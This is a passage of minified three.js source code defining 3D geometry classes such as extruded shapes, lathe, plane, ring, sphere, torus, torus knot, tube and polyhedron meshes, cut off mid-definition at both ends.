THREE.Face3(g,l,h,null,null,1));k=u.generateSideWallUV(I,\nk,g,l,h);I.faceVertexUvs[0].push([k[0],k[1],k[3]]);I.faceVertexUvs[0].push([k[1],k[2],k[3]])}}}function f(a,b,c){I.vertices.push(new THREE.Vector3(a,b,c))}function g(a,b,c){a+=B;b+=B;c+=B;I.faces.push(new THREE.Face3(a,b,c,null,null,0));a=u.generateTopUV(I,a,b,c);I.faceVertexUvs[0].push(a)}var h=void 0!==b.amount?b.amount:100,k=void 0!==b.bevelThickness?b.bevelThickness:6,l=void 0!==b.bevelSize?b.bevelSize:k-2,n=void 0!==b.bevelSegments?b.bevelSegments:3,p=void 0!==b.bevelEnabled?b.bevelEnabled:!0,\nm=void 0!==b.curveSegments?b.curveSegments:12,q=void 0!==b.steps?b.steps:1,r=b.extrudePath,s,t=!1,u=void 0!==b.UVGenerator?b.UVGenerator:THREE.ExtrudeGeometry.WorldUVGenerator,v,C,w,E;r&&(s=r.getSpacedPoints(q),t=!0,p=!1,v=void 0!==b.frames?b.frames:new THREE.TubeGeometry.FrenetFrames(r,q,!1),C=new THREE.Vector3,w=new THREE.Vector3,E=new THREE.Vector3);p||(l=k=n=0);var z,y,A,I=this,B=this.vertices.length,r=a.extractPoints(m),m=r.shape,F=r.holes;if(r=!THREE.ShapeUtils.isClockWise(m)){m=m.reverse();\ny=0;for(A=F.length;y<A;y++)z=F[y],THREE.ShapeUtils.isClockWise(z)&&(F[y]=z.reverse());r=!1}var K=THREE.ShapeUtils.triangulateShape(m,F),P=m;y=0;for(A=F.length;y<A;y++)z=F[y],m=m.concat(z);var M,H,L,O,N,Q=m.length,J,D=K.length,r=[],G=0;L=P.length;M=L-1;for(H=G+1;G<L;G++,M++,H++)M===L&&(M=0),H===L&&(H=0),r[G]=d(P[G],P[M],P[H]);var aa=[],T,X=r.concat();y=0;for(A=F.length;y<A;y++){z=F[y];T=[];G=0;L=z.length;M=L-1;for(H=G+1;G<L;G++,M++,H++)M===L&&(M=0),H===L&&(H=0),T[G]=d(z[G],z[M],z[H]);aa.push(T);X=\nX.concat(T)}for(M=0;M<n;M++){L=M/n;O=k*(1-L);H=l*Math.sin(L*Math.PI/2);G=0;for(L=P.length;G<L;G++)N=c(P[G],r[G],H),f(N.x,N.y,-O);y=0;for(A=F.length;y<A;y++)for(z=F[y],T=aa[y],G=0,L=z.length;G<L;G++)N=c(z[G],T[G],H),f(N.x,N.y,-O)}H=l;for(G=0;G<Q;G++)N=p?c(m[G],X[G],H):m[G],t?(w.copy(v.normals[0]).multiplyScalar(N.x),C.copy(v.binormals[0]).multiplyScalar(N.y),E.copy(s[0]).add(w).add(C),f(E.x,E.y,E.z)):f(N.x,N.y,0);for(L=1;L<=q;L++)for(G=0;G<Q;G++)N=p?c(m[G],X[G],H):m[G],t?(w.copy(v.normals[L]).multiplyScalar(N.x),\nC.copy(v.binormals[L]).multiplyScalar(N.y),E.copy(s[L]).add(w).add(C),f(E.x,E.y,E.z)):f(N.x,N.y,h/q*L);for(M=n-1;0<=M;M--){L=M/n;O=k*(1-L);H=l*Math.sin(L*Math.PI/2);G=0;for(L=P.length;G<L;G++)N=c(P[G],r[G],H),f(N.x,N.y,h+O);y=0;for(A=F.length;y<A;y++)for(z=F[y],T=aa[y],G=0,L=z.length;G<L;G++)N=c(z[G],T[G],H),t?f(N.x,N.y+s[q-1].y,s[q-1].x+O):f(N.x,N.y,h+O)}(function(){if(p){var a;a=0*Q;for(G=0;G<D;G++)J=K[G],g(J[2]+a,J[1]+a,J[0]+a);a=q+2*n;a*=Q;for(G=0;G<D;G++)J=K[G],g(J[0]+a,J[1]+a,J[2]+a)}else{for(G=\n0;G<D;G++)J=K[G],g(J[2],J[1],J[0]);for(G=0;G<D;G++)J=K[G],g(J[0]+Q*q,J[1]+Q*q,J[2]+Q*q)}})();(function(){var a=0;e(P,a);a+=P.length;y=0;for(A=F.length;y<A;y++)z=F[y],e(z,a),a+=z.length})()};\nTHREE.ExtrudeGeometry.WorldUVGenerator={generateTopUV:function(a,b,c,d){a=a.vertices;b=a[b];c=a[c];d=a[d];return[new THREE.Vector2(b.x,b.y),new THREE.Vector2(c.x,c.y),new THREE.Vector2(d.x,d.y)]},generateSideWallUV:function(a,b,c,d,e){a=a.vertices;b=a[b];c=a[c];d=a[d];e=a[e];return.01>Math.abs(b.y-c.y)?[new THREE.Vector2(b.x,1-b.z),new THREE.Vector2(c.x,1-c.z),new THREE.Vector2(d.x,1-d.z),new THREE.Vector2(e.x,1-e.z)]:[new THREE.Vector2(b.y,1-b.z),new THREE.Vector2(c.y,1-c.z),new THREE.Vector2(d.y,\n1-d.z),new THREE.Vector2(e.y,1-e.z)]}};THREE.ShapeGeometry=function(a,b){THREE.Geometry.call(this);this.type=\"ShapeGeometry\";!1===Array.isArray(a)&&(a=[a]);this.addShapeList(a,b);this.computeFaceNormals()};THREE.ShapeGeometry.prototype=Object.create(THREE.Geometry.prototype);THREE.ShapeGeometry.prototype.constructor=THREE.ShapeGeometry;THREE.ShapeGeometry.prototype.addShapeList=function(a,b){for(var c=0,d=a.length;c<d;c++)this.addShape(a[c],b);return this};\nTHREE.ShapeGeometry.prototype.addShape=function(a,b){void 0===b&&(b={});var c=b.material,d=void 0===b.UVGenerator?THREE.ExtrudeGeometry.WorldUVGenerator:b.UVGenerator,e,f,g,h=this.vertices.length;e=a.extractPoints(void 0!==b.curveSegments?b.curveSegments:12);var k=e.shape,l=e.holes;if(!THREE.ShapeUtils.isClockWise(k))for(k=k.reverse(),e=0,f=l.length;e<f;e++)g=l[e],THREE.ShapeUtils.isClockWise(g)&&(l[e]=g.reverse());var n=THREE.ShapeUtils.triangulateShape(k,l);e=0;for(f=l.length;e<f;e++)g=l[e],k=k.concat(g);\nl=k.length;f=n.length;for(e=0;e<l;e++)g=k[e],this.vertices.push(new THREE.Vector3(g.x,g.y,0));for(e=0;e<f;e++)l=n[e],k=l[0]+h,g=l[1]+h,l=l[2]+h,this.faces.push(new THREE.Face3(k,g,l,null,null,c)),this.faceVertexUvs[0].push(d.generateTopUV(this,k,g,l))};\nTHREE.LatheBufferGeometry=function(a,b,c,d){THREE.BufferGeometry.call(this);this.type=\"LatheBufferGeometry\";this.parameters={points:a,segments:b,phiStart:c,phiLength:d};b=Math.floor(b)||12;c=c||0;d=d||2*Math.PI;d=THREE.Math.clamp(d,0,2*Math.PI);for(var e=(b+1)*a.length,f=b*a.length*6,g=new THREE.BufferAttribute(new (65535<f?Uint32Array:Uint16Array)(f),1),h=new THREE.BufferAttribute(new Float32Array(3*e),3),k=new THREE.BufferAttribute(new Float32Array(2*e),2),l=0,n=0,p=1/b,m=new THREE.Vector3,q=new THREE.Vector2,\ne=0;e<=b;e++)for(var f=c+e*p*d,r=Math.sin(f),s=Math.cos(f),f=0;f<=a.length-1;f++)m.x=a[f].x*r,m.y=a[f].y,m.z=a[f].x*s,h.setXYZ(l,m.x,m.y,m.z),q.x=e/b,q.y=f/(a.length-1),k.setXY(l,q.x,q.y),l++;for(e=0;e<b;e++)for(f=0;f<a.length-1;f++)c=f+e*a.length,l=c+a.length,p=c+a.length+1,m=c+1,g.setX(n,c),n++,g.setX(n,l),n++,g.setX(n,m),n++,g.setX(n,l),n++,g.setX(n,p),n++,g.setX(n,m),n++;this.setIndex(g);this.addAttribute(\"position\",h);this.addAttribute(\"uv\",k);this.computeVertexNormals();if(d===2*Math.PI)for(d=\nthis.attributes.normal.array,g=new THREE.Vector3,h=new THREE.Vector3,k=new THREE.Vector3,c=b*a.length*3,f=e=0;e<a.length;e++,f+=3)g.x=d[f+0],g.y=d[f+1],g.z=d[f+2],h.x=d[c+f+0],h.y=d[c+f+1],h.z=d[c+f+2],k.addVectors(g,h).normalize(),d[f+0]=d[c+f+0]=k.x,d[f+1]=d[c+f+1]=k.y,d[f+2]=d[c+f+2]=k.z};THREE.LatheBufferGeometry.prototype=Object.create(THREE.BufferGeometry.prototype);THREE.LatheBufferGeometry.prototype.constructor=THREE.LatheBufferGeometry;\nTHREE.LatheGeometry=function(a,b,c,d){THREE.Geometry.call(this);this.type=\"LatheGeometry\";this.parameters={points:a,segments:b,phiStart:c,phiLength:d};this.fromBufferGeometry(new THREE.LatheBufferGeometry(a,b,c,d));this.mergeVertices()};THREE.LatheGeometry.prototype=Object.create(THREE.Geometry.prototype);THREE.LatheGeometry.prototype.constructor=THREE.LatheGeometry;\nTHREE.PlaneGeometry=function(a,b,c,d){THREE.Geometry.call(this);this.type=\"PlaneGeometry\";this.parameters={width:a,height:b,widthSegments:c,heightSegments:d};this.fromBufferGeometry(new THREE.PlaneBufferGeometry(a,b,c,d))};THREE.PlaneGeometry.prototype=Object.create(THREE.Geometry.prototype);THREE.PlaneGeometry.prototype.constructor=THREE.PlaneGeometry;\nTHREE.PlaneBufferGeometry=function(a,b,c,d){THREE.BufferGeometry.call(this);this.type=\"PlaneBufferGeometry\";this.parameters={width:a,height:b,widthSegments:c,heightSegments:d};var e=a/2,f=b/2;c=Math.floor(c)||1;d=Math.floor(d)||1;var g=c+1,h=d+1,k=a/c,l=b/d;b=new Float32Array(g*h*3);a=new Float32Array(g*h*3);for(var n=new Float32Array(g*h*2),p=0,m=0,q=0;q<h;q++)for(var r=q*l-f,s=0;s<g;s++)b[p]=s*k-e,b[p+1]=-r,a[p+2]=1,n[m]=s/c,n[m+1]=1-q/d,p+=3,m+=2;p=0;e=new (65535<b.length/3?Uint32Array:Uint16Array)(c*\nd*6);for(q=0;q<d;q++)for(s=0;s<c;s++)f=s+g*(q+1),h=s+1+g*(q+1),k=s+1+g*q,e[p]=s+g*q,e[p+1]=f,e[p+2]=k,e[p+3]=f,e[p+4]=h,e[p+5]=k,p+=6;this.setIndex(new THREE.BufferAttribute(e,1));this.addAttribute(\"position\",new THREE.BufferAttribute(b,3));this.addAttribute(\"normal\",new THREE.BufferAttribute(a,3));this.addAttribute(\"uv\",new THREE.BufferAttribute(n,2))};THREE.PlaneBufferGeometry.prototype=Object.create(THREE.BufferGeometry.prototype);THREE.PlaneBufferGeometry.prototype.constructor=THREE.PlaneBufferGeometry;\nTHREE.RingBufferGeometry=function(a,b,c,d,e,f){THREE.BufferGeometry.call(this);this.type=\"RingBufferGeometry\";this.parameters={innerRadius:a,outerRadius:b,thetaSegments:c,phiSegments:d,thetaStart:e,thetaLength:f};a=a||20;b=b||50;e=void 0!==e?e:0;f=void 0!==f?f:2*Math.PI;c=void 0!==c?Math.max(3,c):8;d=void 0!==d?Math.max(1,d):1;var g=(c+1)*(d+1),h=c*d*6,h=new THREE.BufferAttribute(new (65535<h?Uint32Array:Uint16Array)(h),1),k=new THREE.BufferAttribute(new Float32Array(3*g),3),l=new THREE.BufferAttribute(new Float32Array(3*\ng),3),g=new THREE.BufferAttribute(new Float32Array(2*g),2),n=0,p=0,m,q=a,r=(b-a)/d,s=new THREE.Vector3,t=new THREE.Vector2,u;for(a=0;a<=d;a++){for(u=0;u<=c;u++)m=e+u/c*f,s.x=q*Math.cos(m),s.y=q*Math.sin(m),k.setXYZ(n,s.x,s.y,s.z),l.setXYZ(n,0,0,1),t.x=(s.x/b+1)/2,t.y=(s.y/b+1)/2,g.setXY(n,t.x,t.y),n++;q+=r}for(a=0;a<d;a++)for(b=a*(c+1),u=0;u<c;u++)e=m=u+b,f=m+c+1,n=m+c+2,m+=1,h.setX(p,e),p++,h.setX(p,f),p++,h.setX(p,n),p++,h.setX(p,e),p++,h.setX(p,n),p++,h.setX(p,m),p++;this.setIndex(h);this.addAttribute(\"position\",\nk);this.addAttribute(\"normal\",l);this.addAttribute(\"uv\",g)};THREE.RingBufferGeometry.prototype=Object.create(THREE.BufferGeometry.prototype);THREE.RingBufferGeometry.prototype.constructor=THREE.RingBufferGeometry;THREE.RingGeometry=function(a,b,c,d,e,f){THREE.Geometry.call(this);this.type=\"RingGeometry\";this.parameters={innerRadius:a,outerRadius:b,thetaSegments:c,phiSegments:d,thetaStart:e,thetaLength:f};this.fromBufferGeometry(new THREE.RingBufferGeometry(a,b,c,d,e,f))};\nTHREE.RingGeometry.prototype=Object.create(THREE.Geometry.prototype);THREE.RingGeometry.prototype.constructor=THREE.RingGeometry;THREE.SphereGeometry=function(a,b,c,d,e,f,g){THREE.Geometry.call(this);this.type=\"SphereGeometry\";this.parameters={radius:a,widthSegments:b,heightSegments:c,phiStart:d,phiLength:e,thetaStart:f,thetaLength:g};this.fromBufferGeometry(new THREE.SphereBufferGeometry(a,b,c,d,e,f,g))};THREE.SphereGeometry.prototype=Object.create(THREE.Geometry.prototype);\nTHREE.SphereGeometry.prototype.constructor=THREE.SphereGeometry;\nTHREE.SphereBufferGeometry=function(a,b,c,d,e,f,g){THREE.BufferGeometry.call(this);this.type=\"SphereBufferGeometry\";this.parameters={radius:a,widthSegments:b,heightSegments:c,phiStart:d,phiLength:e,thetaStart:f,thetaLength:g};a=a||50;b=Math.max(3,Math.floor(b)||8);c=Math.max(2,Math.floor(c)||6);d=void 0!==d?d:0;e=void 0!==e?e:2*Math.PI;f=void 0!==f?f:0;g=void 0!==g?g:Math.PI;for(var h=f+g,k=(b+1)*(c+1),l=new THREE.BufferAttribute(new Float32Array(3*k),3),n=new THREE.BufferAttribute(new Float32Array(3*\nk),3),k=new THREE.BufferAttribute(new Float32Array(2*k),2),p=0,m=[],q=new THREE.Vector3,r=0;r<=c;r++){for(var s=[],t=r/c,u=0;u<=b;u++){var v=u/b,C=-a*Math.cos(d+v*e)*Math.sin(f+t*g),w=a*Math.cos(f+t*g),E=a*Math.sin(d+v*e)*Math.sin(f+t*g);q.set(C,w,E).normalize();l.setXYZ(p,C,w,E);n.setXYZ(p,q.x,q.y,q.z);k.setXY(p,v,1-t);s.push(p);p++}m.push(s)}d=[];for(r=0;r<c;r++)for(u=0;u<b;u++)e=m[r][u+1],g=m[r][u],p=m[r+1][u],q=m[r+1][u+1],(0!==r||0<f)&&d.push(e,g,q),(r!==c-1||h<Math.PI)&&d.push(g,p,q);this.setIndex(new (65535<\nl.count?THREE.Uint32Attribute:THREE.Uint16Attribute)(d,1));this.addAttribute(\"position\",l);this.addAttribute(\"normal\",n);this.addAttribute(\"uv\",k);this.boundingSphere=new THREE.Sphere(new THREE.Vector3,a)};THREE.SphereBufferGeometry.prototype=Object.create(THREE.BufferGeometry.prototype);THREE.SphereBufferGeometry.prototype.constructor=THREE.SphereBufferGeometry;\nTHREE.TextGeometry=function(a,b){b=b||{};var c=b.font;if(!1===c instanceof THREE.Font)return console.error(\"THREE.TextGeometry: font parameter is not an instance of THREE.Font.\"),new THREE.Geometry;c=c.generateShapes(a,b.size,b.curveSegments);b.amount=void 0!==b.height?b.height:50;void 0===b.bevelThickness&&(b.bevelThickness=10);void 0===b.bevelSize&&(b.bevelSize=8);void 0===b.bevelEnabled&&(b.bevelEnabled=!1);THREE.ExtrudeGeometry.call(this,c,b);this.type=\"TextGeometry\"};\nTHREE.TextGeometry.prototype=Object.create(THREE.ExtrudeGeometry.prototype);THREE.TextGeometry.prototype.constructor=THREE.TextGeometry;\nTHREE.TorusBufferGeometry=function(a,b,c,d,e){THREE.BufferGeometry.call(this);this.type=\"TorusBufferGeometry\";this.parameters={radius:a,tube:b,radialSegments:c,tubularSegments:d,arc:e};a=a||100;b=b||40;c=Math.floor(c)||8;d=Math.floor(d)||6;e=e||2*Math.PI;var f=(c+1)*(d+1),g=c*d*6,g=new (65535<g?Uint32Array:Uint16Array)(g),h=new Float32Array(3*f),k=new Float32Array(3*f),f=new Float32Array(2*f),l=0,n=0,p=0,m=new THREE.Vector3,q=new THREE.Vector3,r=new THREE.Vector3,s,t;for(s=0;s<=c;s++)for(t=0;t<=d;t++){var u=\nt/d*e,v=s/c*Math.PI*2;q.x=(a+b*Math.cos(v))*Math.cos(u);q.y=(a+b*Math.cos(v))*Math.sin(u);q.z=b*Math.sin(v);h[l]=q.x;h[l+1]=q.y;h[l+2]=q.z;m.x=a*Math.cos(u);m.y=a*Math.sin(u);r.subVectors(q,m).normalize();k[l]=r.x;k[l+1]=r.y;k[l+2]=r.z;f[n]=t/d;f[n+1]=s/c;l+=3;n+=2}for(s=1;s<=c;s++)for(t=1;t<=d;t++)a=(d+1)*(s-1)+t-1,b=(d+1)*(s-1)+t,e=(d+1)*s+t,g[p]=(d+1)*s+t-1,g[p+1]=a,g[p+2]=e,g[p+3]=a,g[p+4]=b,g[p+5]=e,p+=6;this.setIndex(new THREE.BufferAttribute(g,1));this.addAttribute(\"position\",new THREE.BufferAttribute(h,\n3));this.addAttribute(\"normal\",new THREE.BufferAttribute(k,3));this.addAttribute(\"uv\",new THREE.BufferAttribute(f,2))};THREE.TorusBufferGeometry.prototype=Object.create(THREE.BufferGeometry.prototype);THREE.TorusBufferGeometry.prototype.constructor=THREE.TorusBufferGeometry;\nTHREE.TorusGeometry=function(a,b,c,d,e){THREE.Geometry.call(this);this.type=\"TorusGeometry\";this.parameters={radius:a,tube:b,radialSegments:c,tubularSegments:d,arc:e};this.fromBufferGeometry(new THREE.TorusBufferGeometry(a,b,c,d,e))};THREE.TorusGeometry.prototype=Object.create(THREE.Geometry.prototype);THREE.TorusGeometry.prototype.constructor=THREE.TorusGeometry;\nTHREE.TorusKnotBufferGeometry=function(a,b,c,d,e,f){function g(a,b,c,d,e){var f=Math.cos(a),g=Math.sin(a);a*=c/b;b=Math.cos(a);e.x=d*(2+b)*.5*f;e.y=d*(2+b)*g*.5;e.z=d*Math.sin(a)*.5}THREE.BufferGeometry.call(this);this.type=\"TorusKnotBufferGeometry\";this.parameters={radius:a,tube:b,tubularSegments:c,radialSegments:d,p:e,q:f};a=a||100;b=b||40;c=Math.floor(c)||64;d=Math.floor(d)||8;e=e||2;f=f||3;var h=(d+1)*(c+1),k=d*c*6,k=new THREE.BufferAttribute(new (65535<k?Uint32Array:Uint16Array)(k),1),l=new THREE.BufferAttribute(new Float32Array(3*\nh),3),n=new THREE.BufferAttribute(new Float32Array(3*h),3),h=new THREE.BufferAttribute(new Float32Array(2*h),2),p,m,q=0,r=0,s=new THREE.Vector3,t=new THREE.Vector3,u=new THREE.Vector2,v=new THREE.Vector3,C=new THREE.Vector3,w=new THREE.Vector3,E=new THREE.Vector3,z=new THREE.Vector3;for(p=0;p<=c;++p)for(m=p/c*e*Math.PI*2,g(m,e,f,a,v),g(m+.01,e,f,a,C),E.subVectors(C,v),z.addVectors(C,v),w.crossVectors(E,z),z.crossVectors(w,E),w.normalize(),z.normalize(),m=0;m<=d;++m){var y=m/d*Math.PI*2,A=-b*Math.cos(y),\ny=b*Math.sin(y);s.x=v.x+(A*z.x+y*w.x);s.y=v.y+(A*z.y+y*w.y);s.z=v.z+(A*z.z+y*w.z);l.setXYZ(q,s.x,s.y,s.z);t.subVectors(s,v).normalize();n.setXYZ(q,t.x,t.y,t.z);u.x=p/c;u.y=m/d;h.setXY(q,u.x,u.y);q++}for(m=1;m<=c;m++)for(p=1;p<=d;p++)a=(d+1)*m+(p-1),b=(d+1)*m+p,e=(d+1)*(m-1)+p,k.setX(r,(d+1)*(m-1)+(p-1)),r++,k.setX(r,a),r++,k.setX(r,e),r++,k.setX(r,a),r++,k.setX(r,b),r++,k.setX(r,e),r++;this.setIndex(k);this.addAttribute(\"position\",l);this.addAttribute(\"normal\",n);this.addAttribute(\"uv\",h)};\nTHREE.TorusKnotBufferGeometry.prototype=Object.create(THREE.BufferGeometry.prototype);THREE.TorusKnotBufferGeometry.prototype.constructor=THREE.TorusKnotBufferGeometry;\nTHREE.TorusKnotGeometry=function(a,b,c,d,e,f,g){THREE.Geometry.call(this);this.type=\"TorusKnotGeometry\";this.parameters={radius:a,tube:b,tubularSegments:c,radialSegments:d,p:e,q:f};void 0!==g&&console.warn(\"THREE.TorusKnotGeometry: heightScale has been deprecated. Use .scale( x, y, z ) instead.\");this.fromBufferGeometry(new THREE.TorusKnotBufferGeometry(a,b,c,d,e,f));this.mergeVertices()};THREE.TorusKnotGeometry.prototype=Object.create(THREE.Geometry.prototype);\nTHREE.TorusKnotGeometry.prototype.constructor=THREE.TorusKnotGeometry;\nTHREE.TubeGeometry=function(a,b,c,d,e,f){THREE.Geometry.call(this);this.type=\"TubeGeometry\";this.parameters={path:a,segments:b,radius:c,radialSegments:d,closed:e,taper:f};b=b||64;c=c||1;d=d||8;e=e||!1;f=f||THREE.TubeGeometry.NoTaper;var g=[],h,k,l=b+1,n,p,m,q,r,s=new THREE.Vector3,t,u,v;t=new THREE.TubeGeometry.FrenetFrames(a,b,e);u=t.normals;v=t.binormals;this.tangents=t.tangents;this.normals=u;this.binormals=v;for(t=0;t<l;t++)for(g[t]=[],n=t/(l-1),r=a.getPointAt(n),h=u[t],k=v[t],m=c*f(n),n=0;n<\nd;n++)p=n/d*2*Math.PI,q=-m*Math.cos(p),p=m*Math.sin(p),s.copy(r),s.x+=q*h.x+p*k.x,s.y+=q*h.y+p*k.y,s.z+=q*h.z+p*k.z,g[t][n]=this.vertices.push(new THREE.Vector3(s.x,s.y,s.z))-1;for(t=0;t<b;t++)for(n=0;n<d;n++)f=e?(t+1)%b:t+1,l=(n+1)%d,a=g[t][n],c=g[f][n],f=g[f][l],l=g[t][l],s=new THREE.Vector2(t/b,n/d),u=new THREE.Vector2((t+1)/b,n/d),v=new THREE.Vector2((t+1)/b,(n+1)/d),h=new THREE.Vector2(t/b,(n+1)/d),this.faces.push(new THREE.Face3(a,c,l)),this.faceVertexUvs[0].push([s,u,h]),this.faces.push(new THREE.Face3(c,\nf,l)),this.faceVertexUvs[0].push([u.clone(),v,h.clone()]);this.computeFaceNormals();this.computeVertexNormals()};THREE.TubeGeometry.prototype=Object.create(THREE.Geometry.prototype);THREE.TubeGeometry.prototype.constructor=THREE.TubeGeometry;THREE.TubeGeometry.NoTaper=function(a){return 1};THREE.TubeGeometry.SinusoidalTaper=function(a){return Math.sin(Math.PI*a)};\nTHREE.TubeGeometry.FrenetFrames=function(a,b,c){var d=new THREE.Vector3,e=[],f=[],g=[],h=new THREE.Vector3,k=new THREE.Matrix4;b+=1;var l,n,p;this.tangents=e;this.normals=f;this.binormals=g;for(l=0;l<b;l++)n=l/(b-1),e[l]=a.getTangentAt(n),e[l].normalize();f[0]=new THREE.Vector3;g[0]=new THREE.Vector3;a=Number.MAX_VALUE;l=Math.abs(e[0].x);n=Math.abs(e[0].y);p=Math.abs(e[0].z);l<=a&&(a=l,d.set(1,0,0));n<=a&&(a=n,d.set(0,1,0));p<=a&&d.set(0,0,1);h.crossVectors(e[0],d).normalize();f[0].crossVectors(e[0],\nh);g[0].crossVectors(e[0],f[0]);for(l=1;l<b;l++)f[l]=f[l-1].clone(),g[l]=g[l-1].clone(),h.crossVectors(e[l-1],e[l]),h.length()>Number.EPSILON&&(h.normalize(),d=Math.acos(THREE.Math.clamp(e[l-1].dot(e[l]),-1,1)),f[l].applyMatrix4(k.makeRotationAxis(h,d))),g[l].crossVectors(e[l],f[l]);if(c)for(d=Math.acos(THREE.Math.clamp(f[0].dot(f[b-1]),-1,1)),d/=b-1,0<e[0].dot(h.crossVectors(f[0],f[b-1]))&&(d=-d),l=1;l<b;l++)f[l].applyMatrix4(k.makeRotationAxis(e[l],d*l)),g[l].crossVectors(e[l],f[l])};\nTHREE.PolyhedronGeometry=function(a,b,c,d){function e(a){var b=a.normalize().clone();b.index=k.vertices.push(b)-1;var c=Math.atan2(a.z,-a.x)/2/Math.PI+.5;a=Math.atan2(-a.y,Math.sqrt(a.x*a.x+a.z*a.z))/Math.PI+.5;b.uv=new THREE.Vector2(c,1-a);return b}function f(a,b,c){var d=new THREE.Face3(a.index,b.index,c.index,[a.clone(),b.clone(),c.clone()]);k.faces.push(d);t.copy(a).add(b).add(c).divideScalar(3);d=Math.atan2(t.z,-t.x);k.faceVertexUvs[0].push([h(a.uv,a,d),h(b.uv,b,d),h(c.uv,c,d)])}function g(a,\nb){for(var c=Math.pow(2,b),d=e(k.vertices[a.a]),g=e(k.vertices[a.b]),h=e(k.vertices[a.c]),l=[],m=0;m<=c;m++){l[m]=[];for(var n=e(d.clone().lerp(h,m/c)),p=e(g.clone().lerp(h,m/c)),q=c-m,r=0;r<=q;r++)l[m][r]=0===r&&m===c?n:e(n.clone().lerp(p,r/q))}for(m=0;m<c;m++)for(r=0;r<2*(c-m)-1;r++)d=Math.floor(r/2),0===r%2?f(l[m][d+1],l[m+1][d],l[m][d]):f(l[m][d+1],l[m+1][d+1],l[m+1][d])}function h(a,b,c){0>c&&1===a.x&&(a=new THREE.Vector2(a.x-1,a.y));0===b.x&&0===b.z&&(a=new THREE.Vector2(c/2/Math.PI+.5,a.y));\nreturn a.clone()}THREE.Geometry.call(this);this.type=\"PolyhedronGeometry\";this.parameters={vertices:a,indices:b,radius:c,detail:d};c=c||1;d=d||0;for(var k=this,l=0,n=a.length;l<n;l+=3)e(new THREE.Vector3(a[l],a[l+1],a[l+2]));a=this.vertices;for(var p=[],m=l=0,n=b.length;l<n;l+=3,m++){var q=a[b[l]],r=a[b[l+1]],s=a[b[l+2]];p[m]=new THREE.Face3(q.index,r.index,s.index,[q.clone(),r.clone(),s.clone()])}for(var t=new THREE.Vector3,l=0,n=p.length;l<n;l++)g(p[l],d);l=0;for(n=this.faceVertexUvs[0].length;l<\nn;l++)b=this.faceVertexUvs[0][l],d=b[0].x,a=b[1].x,p=b[2].x,m=Math.max(d,a,p),q=Math.min(d,a,p),.9<m&&.1>q&&(.2>d&&(b[0].x+=1),.2>a&&(b[1].x+=1),.2>p&&(b[2].x+=1));l=0;for(n=this.vertices.length;l<n;l++)this.vertices[l].multiplyScalar(c);this.mergeVertices();this.computeFaceNormals();this.boundingSphere=new THREE.Sphere(new THREE.Vector3,c)};THREE.PolyhedronGeometry.prototype=Object.create(THREE.Geometry.prototype);THREE.PolyhedronGeometry.prototype.constructor=THREE.PolyhedronGeometry;\nTHREE.DodecahedronGeometry=function(a,b){var c=(1+Math.sqrt(5))/2,d=1/c;THREE.PolyhedronGeometry.call(this,[-1,-1,-1,-1,-1,1,-1,1,-1,-1,1,1,1,-1,-1,1,-1,1,1,1,-1,1,1,1,0,-d,-c,0,-d,c,0,d,-c,0,d,c,-d,-c,0,-d,c,0,d,-c,0,d,c,0,-c,0,-d,c,0,-d,-c,0,d,c,0,d],[3,11,7,3,7,15,3,15,13,7,19,17,7,17,6,7,6,15,17,4,8,17,8,10,17,10,6,8,0,16,8,16,2,8,2,10,0,12,1,0,1,18,0,18,16,6,10,2,6,2,13,6,13,15,2,16,18,2,18,3,2,3,13,18,1,9,18,9,11,18,11,3,4,14,12,4,12,0,4,0,8,11,9,5,11,5,19,11,19,7,19,5,14,19,14,4,19,4,17,1,\n12,14,1,14,5,1,5,9],a,b);this.type=\"DodecahedronGeometry\";this.parameters={radius:a,detail:b}};THREE.DodecahedronGeometry.prototype=Object.create(THREE.PolyhedronGeometry.prototype);THREE.DodecahedronGeometry.prototype.constructor=THREE.DodecahedronGeometry;\nTHREE.IcosahedronGeometry=function(a,b){var c=(1+Math.sqrt(5))/2;THREE.PolyhedronGeometry.call(this,[-1,c,0,1,c,0,-1,-c,0,1,-c,0,0,-1,c,0,1,c,0,-1,-c,0,1,-c,c,0,-1,c,0,1,-c,0,-1,-c,0,1],[0,11,5,0,5,1,0,1,7,0,7,10,0,10,11,1,5,9,5,11,4,11,10,2,10,7,6,7,1,8,3,9,4,3,4,2,3,2,6,3,6,8,3,8,9,4,9,5,2,4,11,6,2,10,8,6,7,9,8,1],a,b);this.type=\"IcosahedronGeometry\";this.parameters={radius:a,detail:b}};THREE.IcosahedronGeometry.prototype=Object.create(THREE.PolyhedronGeometry.prototype);\nTHREE.IcosahedronGeometry.prototype.constructor=THREE.IcosahedronGeometry;THREE.OctahedronGeometry=function(a,b){THREE.PolyhedronGeometry.call(this,[1,0,0,-1,0,0,0,1,0,0,-1,0,0,0,1,0,0,-1],[0,2,4,0,4,3,0,3,5,0,5,2,1,2,5,1,5,3,1,3,4,1,4,2],a,b);this.type=\"OctahedronGeometry\";this.parameters={radius:a,detail:b}};THREE.OctahedronGeometry.prototype=Object.create(THREE.PolyhedronGeometry.prototype);THREE.OctahedronGeometry.prototype.constructor=THREE.OctahedronGeometry;\nTHREE.TetrahedronGeometry=function(a,b){THREE.PolyhedronGeometry.call(this,[1,1,1,-1,-1,1,-1,1,-1,1,-1,-1],[2,1,0,0,3,2,1,3,0,2,3,1],a,b);this.type=\"TetrahedronGeometry\";this.parameters={radius:a,detail:b}};THREE.TetrahedronGeometry.prototype=Object.create(THREE.PolyhedronGeometry.prototype);THREE.TetrahedronGeometry.prototype.constructor=THREE.TetrahedronGeometry;\nTHREE.ParametricGeometry=function(a,b,c){THREE.Geometry.call(this);this.type=\"ParametricGeometry\";this.parameters={func:a,slices:b,stacks:c};var d=this.vertices,e=this.faces,f=this.faceVertexUvs[0],g,h,k,l,n=b+1;for(g=0;g<=c;g++)for(l=g/c,h=0;h<=b;h++)k=h/b,k=a(k,l),d.push(k);var p,m,q,r;for(g=0;g<c;g++)for(h=0;h<b;h++)a=g*n+h,d=g*n+h+1,l=(g+1)*n+h+1,k=(g+1)*n+h,p=new THREE.Vector2(h/b,g/c),m=new THREE.Vector2((h+1)/b,g/c),q=new THREE.Vector2((h+1)/b,(g+1)/c),r=new THREE.Vector2(h/b,(g+1)/c),e.push(new THREE.Face3(a,\nd,k)),f.push([p,m,r]),e.push(new THREE.Face3(d,l,k)),f.push([m.clone(),q,r.clone()]);this.computeFaceNormals();this.computeVertexNormals()};THREE.ParametricGeometry.prototype=Object.create(THREE.Geometry.prototype);THREE.ParametricGeometry.prototype.constructor=THREE.ParametricGeometry;\nTHREE.WireframeGeometry=function(a){function b(a,b){return a-b}THREE.BufferGeometry.call(this);var 